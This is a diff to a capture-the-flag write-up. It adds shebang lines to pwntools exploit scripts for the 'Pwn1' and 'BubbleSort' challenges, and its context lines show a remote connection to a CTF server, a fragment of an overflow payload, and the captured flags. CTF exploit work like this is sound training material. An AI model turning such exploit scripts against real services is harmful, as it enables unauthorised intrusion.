@@ -10,6 +10,8 @@ FLAG{Hello CTF}
 
 ### Pwn1
 ```python=
+#!/usr/bin/env python
+
 from pwn import *
 
 r = remote('csie.ctf.tw', 10120)
@@ -30,6 +32,8 @@ FLAG{BuFFer_0V3Rflow_is_too_easy}
 
 ### BubbleSort
 ```python=
+#!/usr/bin/env python
+
 from pwn import *
 
 payload = '127' + '\n' + '134514048 '
